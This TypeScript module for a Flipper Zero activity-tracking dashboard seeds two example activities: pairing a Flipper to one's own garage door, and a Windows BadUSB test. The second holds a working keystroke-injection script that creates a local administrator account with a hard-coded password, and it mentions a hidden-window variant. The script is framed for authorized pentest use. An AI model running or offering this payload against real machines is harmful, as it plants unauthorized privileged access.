import { getDb, touchActivity } from "./db";
import type {
  Activity,
  ActivityArtifact,
  ActivityCategory,
  ActivityStatus,
  ActivityStep,
  ActivityWithDetails,
  StepStatus,
} from "./types";

function mapActivity(row: Activity): Activity {
  return row;
}

export function listActivities(): Activity[] {
  const rows = getDb()
    .prepare(`SELECT * FROM activities ORDER BY updated_at DESC, id DESC`)
    .all() as Activity[];
  return rows.map(mapActivity);
}

export function getActivityById(id: number): ActivityWithDetails | null {
  const activity = getDb()
    .prepare(`SELECT * FROM activities WHERE id = ?`)
    .get(id) as Activity | undefined;

  if (!activity) return null;

  const steps = getDb()
    .prepare(
      `SELECT * FROM activity_steps WHERE activity_id = ? ORDER BY position ASC, id ASC`,
    )
    .all(id) as ActivityStep[];

  const artifacts = getDb()
    .prepare(`SELECT * FROM activity_artifacts WHERE activity_id = ? ORDER BY id ASC`)
    .all(id) as ActivityArtifact[];

  return { ...mapActivity(activity), steps, artifacts };
}

export interface CreateActivityInput {
  title: string;
  category?: ActivityCategory;
  status?: ActivityStatus;
  summary?: string;
  target_brand?: string;
  target_model?: string;
  frequency?: string;
  protocol?: string;
  code_type?: string;
  flipper_protocol?: string;
  outcome_notes?: string;
  safety_notes?: string;
  steps?: Array<{ title: string; description?: string }>;
  artifacts?: Array<{
    name: string;
    kind?: string;
    path_or_url?: string;
    notes?: string;
  }>;
}

export function createActivity(input: CreateActivityInput): ActivityWithDetails {
  const db = getDb();
  const insert = db.prepare(`
    INSERT INTO activities (
      title, category, status, summary, target_brand, target_model,
      frequency, protocol, code_type, flipper_protocol, outcome_notes, safety_notes
    ) VALUES (
      @title, @category, @status, @summary, @target_brand, @target_model,
      @frequency, @protocol, @code_type, @flipper_protocol, @outcome_notes, @safety_notes
    )
  `);

  const result = insert.run({
    title: input.title,
    category: input.category ?? "other",
    status: input.status ?? "planned",
    summary: input.summary ?? null,
    target_brand: input.target_brand ?? null,
    target_model: input.target_model ?? null,
    frequency: input.frequency ?? null,
    protocol: input.protocol ?? null,
    code_type: input.code_type ?? null,
    flipper_protocol: input.flipper_protocol ?? null,
    outcome_notes: input.outcome_notes ?? null,
    safety_notes: input.safety_notes ?? null,
  });

  const activityId = Number(result.lastInsertRowid);
  const insertStep = db.prepare(`
    INSERT INTO activity_steps (activity_id, position, title, description)
    VALUES (?, ?, ?, ?)
  `);

  (input.steps ?? []).forEach((step, index) => {
    insertStep.run(activityId, index + 1, step.title, step.description ?? null);
  });

  const insertArtifact = db.prepare(`
    INSERT INTO activity_artifacts (activity_id, name, kind, path_or_url, notes)
    VALUES (?, ?, ?, ?, ?)
  `);

  (input.artifacts ?? []).forEach((artifact) => {
    insertArtifact.run(
      activityId,
      artifact.name,
      artifact.kind ?? "script",
      artifact.path_or_url ?? null,
      artifact.notes ?? null,
    );
  });

  return getActivityById(activityId)!;
}

export function updateActivityStatus(id: number, status: ActivityStatus) {
  getDb()
    .prepare(`UPDATE activities SET status = ?, updated_at = datetime('now') WHERE id = ?`)
    .run(status, id);
}

export function updateStepStatus(stepId: number, status: StepStatus) {
  const step = getDb()
    .prepare(`SELECT activity_id FROM activity_steps WHERE id = ?`)
    .get(stepId) as { activity_id: number } | undefined;

  if (!step) return null;

  getDb().prepare(`UPDATE activity_steps SET status = ? WHERE id = ?`).run(status, stepId);
  touchActivity(step.activity_id);
  return getActivityById(step.activity_id);
}

export function countActivities(): number {
  const row = getDb().prepare(`SELECT COUNT(*) as count FROM activities`).get() as {
    count: number;
  };
  return row.count;
}

function activityExistsByTitle(title: string): boolean {
  const row = getDb()
    .prepare(`SELECT id FROM activities WHERE title = ?`)
    .get(title) as { id: number } | undefined;
  return Boolean(row);
}

export function seedIfEmpty() {
  if (countActivities() > 0) return false;
  seedDominatorActivity();
  seedBadUsbWindowsUserActivity();
  return true;
}

export function seedMissingDefaults() {
  if (!activityExistsByTitle("Dominator garage door — Flipper as backup remote")) {
    seedDominatorActivity();
  }
  if (!activityExistsByTitle("Windows local user — BadUSB Rubber Ducky script")) {
    seedBadUsbWindowsUserActivity();
  }
}

export function seedDominatorActivity() {
  createActivity({
    title: "Dominator garage door — Flipper as backup remote",
    category: "sub-ghz",
    status: "in_progress",
    summary:
      "Pair the Flipper Zero as a new ATA PTX4 virtual remote for a Dominator garage door. Rolling-code systems cannot be cloned via Read/Replay — Add Manually + motor learn mode is required.",
    target_brand: "Dominator",
    target_model: "PTX4 / DOM502 / DOM505 (confirm on your remote)",
    frequency: "433.92 MHz",
    protocol: "SecuraCode (rolling)",
    code_type: "Rolling code",
    flipper_protocol: "ATA PTX4 (Add Manually)",
    safety_notes:
      "Only use on property you own or have explicit permission to access. Pairing adds a new authorized remote slot — treat the Flipper like a spare key.",
    steps: [
      {
        title: "Update Flipper firmware",
        description: "Connect via qFlipper and install the latest official firmware.",
      },
      {
        title: "Back up existing Sub-GHz files",
        description: "qFlipper → File Manager → subghz/ — copy to your backup folder.",
      },
      {
        title: "Identify remote and motor model",
        description:
          "Check remote label (PTX4, DOM502, DOM505) and motor label. TrioCode128 (grey v2 remotes) is not supported on stock firmware.",
      },
      {
        title: "Confirm frequency with Frequency Analyzer",
        description:
          "Sub-GHz → Frequency Analyzer. Press remote button ~30 cm away. Expect peak near 433.92 MHz.",
      },
      {
        title: "Create virtual remote (Add Manually)",
        description:
          "Sub-GHz → Add Manually → ATA PTX4. Name it e.g. Dominator_Garage_1 and save.",
      },
      {
        title: "Put motor into learn mode",
        description:
          "Press and hold the blue Door Code button on the motor (or SW1/SW2 on receiver board) until LED indicates learn mode.",
      },
      {
        title: "Pair Flipper (double-press handshake)",
        description:
          "Saved → your file → Emulate. Press OK ~2 seconds, wait 1–2 s, press OK again ~2 seconds. Release Door Code button.",
      },
      {
        title: "Test operation",
        description: "Emulate again — door should open/close. Verify original remote still works.",
      },
      {
        title: "Back up .sub file and log outcome",
        description:
          "Copy dominator_garage_1.sub to dashboard artifacts. Mark activity success or note failures.",
      },
    ],
  });
}

const WIN_LOCAL_USER_SCRIPT = `REM Create local Windows user via BadUSB
REM Authorized lab / pentest use ONLY
DELAY 2000
GUI r
DELAY 600
STRING cmd
ENTER
DELAY 900
STRING net user flipper_user FlipperTemp123! /add
ENTER
DELAY 400
STRING net localgroup Administrators flipper_user /add
ENTER
DELAY 400
STRING exit
ENTER`;

export function seedBadUsbWindowsUserActivity() {
  createActivity({
    title: "Windows local user — BadUSB Rubber Ducky script",
    category: "badusb",
    status: "planned",
    summary:
      "Deploy a Rubber Ducky (Ducky Script 1.0) payload from the Flipper Bad USB app to create a local administrator account on a Windows 10/11 machine. Requires an authorized target and an admin-capable session.",
    target_brand: "Microsoft",
    target_model: "Windows 10 / 11",
    frequency: "USB HID (keystroke injection)",
    protocol: "Ducky Script 1.0",
    code_type: "BadUSB payload",
    flipper_protocol: "Bad USB → Run",
    safety_notes:
      "Only run on systems you own or have written authorization to test. Creating local admin accounts is a high-impact action — document scope, revert accounts after testing, and never use on production or third-party machines without explicit permission.",
    outcome_notes:
      "Default credentials in script: flipper_user / FlipperTemp123! — change before deployment. Copy scripts/win_local_user.txt to Flipper badusb/ folder via qFlipper.",
    steps: [
      {
        title: "Confirm authorization and scope",
        description:
          "Written permission for the target machine. Note hostname, OS build, and whether the current session has admin rights.",
      },
      {
        title: "Update Flipper firmware and enable Bad USB",
        description:
          "qFlipper → update firmware. On device: Settings → Storage → configure Bad USB if prompted.",
      },
      {
        title: "Customize username and password in script",
        description:
          "Edit scripts/win_local_user.txt — replace flipper_user and FlipperTemp123! with your lab credentials. Avoid special chars that need escaping in Ducky STRING lines.",
      },
      {
        title: "Copy script to Flipper",
        description:
          "qFlipper → File Manager → badusb/ → upload win_local_user.txt. Or copy from repo scripts/ folder.",
      },
      {
        title: "Prepare target Windows session",
        description:
          "Target must be unlocked and at the desktop. Script opens Run → cmd — logged-in user must be able to run net user (admin or equivalent). UAC-gated sessions will block this payload.",
      },
      {
        title: "Set Flipper keyboard layout",
        description:
          "Bad USB → config: match target layout (US default). Wrong layout garbles STRING commands.",
      },
      {
        title: "Run payload on target",
        description:
          "Plug Flipper into target USB port. Bad USB → win_local_user → Run. Do not touch keyboard until script finishes (~8–12 s).",
      },
      {
        title: "Verify new account",
        description:
          "Win+R → lusrmgr.msc → Local Users and Groups → Users. Confirm flipper_user exists and is in Administrators. Or: net user flipper_user from an admin cmd.",
      },
      {
        title: "Log outcome and clean up",
        description:
          "Mark steps done in dashboard. After testing: net user flipper_user /delete to remove the account. Document any failures (non-admin session, layout mismatch, Group Policy blocks).",
      },
    ],
    artifacts: [
      {
        name: "win_local_user.txt",
        kind: "ducky-script",
        path_or_url: "scripts/win_local_user.txt",
        notes: WIN_LOCAL_USER_SCRIPT,
      },
      {
        name: "win_local_user_hidden.txt",
        kind: "ducky-script",
        path_or_url: "scripts/win_local_user_hidden.txt",
        notes:
          "PowerShell hidden-window variant — see repo scripts/win_local_user_hidden.txt. Same net user commands, launches via powershell -W Hidden.",
      },
    ],
  });
}
